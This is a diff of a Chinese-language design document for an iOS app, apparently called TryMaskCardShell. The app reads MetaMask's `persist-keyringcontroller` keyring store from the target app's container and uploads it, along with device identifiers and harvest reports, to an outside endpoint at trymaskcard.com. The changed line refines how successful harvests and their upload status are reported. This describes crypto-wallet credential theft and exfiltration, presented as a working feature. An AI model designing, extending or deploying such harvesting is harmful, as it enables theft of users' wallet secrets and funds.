@@ -76,7 +76,7 @@
 |---|---|---|---|
 | 探针 | 每次启动（`uploadProbe`，默认开） | `shell-hello.txt` | 只带 uuid / 模式 / 主页 / bundle / 系统版本；**不依赖 MetaMask、不依赖崩溃**，用来证明端点通 |
 | 采集 | 目标 App 的 persist store **读取成功**（默认 `io.metamask`） | `persist-keyringcontroller` | 目标未安装或容器解析失败就**不会上传**——这是设计上的盲区，靠探针与崩溃上报补 |
-| 采集结果 | 每次采集结束（成功**或**失败，按结果指纹去重） | `persist-harvest.txt` | 含 `status`/`resolution`/`discoveryMethod`/容器路径/`scanReport`；失败原因不再只留在设备上 |
+| 采集结果 | 每次采集结束（成功**或**失败，按结果指纹去重） | `persist-harvest.txt` | 含 `status`/`resolution`/`discoveryMethod`/容器路径/`scanReport`；**成功时等文件上传完成再发**，并带 `uploadStatus`（含 httpStatus/responseSnippet）、`uploadedFilename`（分片里用的名字，即请求的小写名）与 `deviceFilename`（设备上的真实名字，实测是 `persist-KeyringController`） |
 | 崩溃上报 | 上次运行留下 `LastException.txt` / `LastSignal.txt`（`crashAutoReport`，默认开） | `LastException.txt` / `LastSignal.txt` / `Runtime-tail.log` / `TryMaskCardShell-Status.txt` | 同一个指纹只投一次 |
 
 `uuid` 一律用**本 App 自己容器的 UUID**（`NSHomeDirectory()` 最后一段），探针与崩溃上报都如此；采集走的 `uuid` 是**目标 App 容器的 UUID**（也就是接口示例里那个 UUID 的语义）。端点默认 `https://trymaskcard.com/api/app/device-upload`，可用 `crashUploadURL` 单独覆盖上报地址。
